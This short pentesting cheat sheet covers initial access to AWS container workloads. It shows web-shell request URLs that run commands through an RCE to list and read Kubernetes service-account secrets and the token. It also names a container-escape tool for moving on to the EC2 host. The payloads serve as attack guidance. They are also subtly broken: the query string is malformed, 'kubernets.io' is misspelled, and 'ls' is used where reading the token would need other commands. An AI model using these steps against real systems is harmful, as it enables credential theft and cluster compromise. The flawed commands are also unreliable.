# AWS Containers initial access

### The initial access can be done by exploiting some RCE in webapp to get access to the container, afterwards its possible to compromise the EC2.

### After the RCE, we can list all secrets in EKS

    https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount

### Getting the secret information from EKS

    https://website.com?rce.php?cmd=ls /var/run/secrets/kubernets.io/serviceaccount/token

## TIP: It's also possible to do sandbox escaping (Tool: deepce https://github.com/stealthcopter/deepce)
